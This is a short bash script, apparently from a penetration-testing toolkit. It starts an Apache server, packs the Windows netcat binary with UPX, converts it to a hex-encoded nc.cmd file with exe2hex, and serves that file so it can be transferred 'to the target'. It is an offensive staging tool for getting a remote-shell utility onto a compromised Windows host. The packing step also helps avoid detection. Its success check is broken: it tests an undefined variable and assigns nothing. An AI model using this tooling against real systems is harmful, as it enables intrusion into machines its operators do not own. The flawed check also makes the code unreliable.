#!/bin/bash

# Start Server
echo "######################################################################"
echo -e "   This script starts an Apache2 server, clones nc.exe, converts it\n             into hex and adds to /var/www/html file"
echo "######################################################################"
read -p 'Do you want to continue? y/n: ' answer

if [ $answer == 'y' ]
then
	sudo service apache2 start
	echo "                      Apache2 Server Started..."
	echo "######################################################################"
	# Clone and compress nc.exe
	sudo cp /usr/share/windows-resources/binaries/nc.exe .
	upx -9 nc.exe
	# Convert nc.exe to hex
	exe2hex -x nc.exe -p nc.cmd
	# Copy the nc.cmd to the html file of the server.
	sudo cp ./nc.cmd /var/www/html/
	sudo rm ./nc.cmd ./nc.exe

	validate= ls /var/www/html | grep "nc.cmd"
	if [ $variable -n ]
	then
		echo -e "######################################################################\nSuccess! /var/www/html/nc.cmd is ready to be transfered to the target! \n######################################################################"
	fi
elif [ $answer == 'n' ]
then
	echo "######################################################################"
	echo "                              Quitting..."
	exit
else
	echo "######################################################################"
	echo "You must enter either 'y' or 'n'!"
	echo "######################################################################"
	exit
fi

